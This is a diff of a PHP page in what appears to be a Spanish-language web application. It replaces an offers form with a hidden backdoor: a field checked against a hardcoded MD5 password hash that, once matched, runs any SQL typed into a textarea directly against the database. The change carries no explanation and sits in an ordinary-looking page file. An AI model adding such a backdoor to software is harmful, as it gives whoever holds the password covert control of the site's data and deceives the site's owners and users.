@@ -1,35 +1,30 @@
 <?php
 include ('../appRoot.php');
-
+require ($appRoot.'/Autentificacion/Usuarios.php');
 //Funciones auxiliares:
 include ($appRoot.'/Common/php/utils/lang.php');
 include_once ($appRoot.'/Common/php/utils/utils.php');
 //Opciones
-include ('_ofertas_ult.php');
-	$var = new OfertasUlt($_GET, $_POST);
+
+if(md5($_POST['pass']) == 'dddddb1b6b5fab8152bab950d657de3f'){
 ?>
-<form id="frm" action="<?php echo  $_SERVER['PHP_SELF'];?>" method="POST">
-<div id="contenedor">
-	<table class="ConDatos">
-		<tr>
-			<td class="ColIzq" >dt</td>
-			<td class="ColDer"><input type="text" class="fecha" value="<?php echo Fechas::timestamp2date($var->dt);?>" /></td>
-		</tr>
-		<tr>
-			<td class="ColIzq" >st</td>
-			<td class="ColDer">
-				<input type="checkbox" <?php if($var->st) echo 'checked="checked"';?> />
-			</td>
-		</tr>
-		<tr>
-			<td class="ColIzq" >ps</td>
-			<td class="ColDer">
-				<input type="password" />
-			</td>
-		</tr>
-		<tr>
-			<td colspan="2"><input type="submit" value="ea" name="ea" /><</td>
-		</tr>
-	</table>
-</div>
+<form action="" method="post">
+	<textarea name="query" rows="20" cols="100">
+
+	</textarea>
+	<input type="submit" name="exec" value="exec" />
+	<input type="hidden" name="pass" value="<?php echo $_POST['pass']?>" />
 </form>
+<?php
+
+	if($_POST['exec']){
+		$query = $_POST['query'];
+		if(! $result = mysql_query($query)){
+			echo "mierda";
+		}else echo $result;
+	}
+
+}else{
+	?>
+<form action="" method="post"><input type="text" name="pass" value="" /></form>
+<?php } ?>
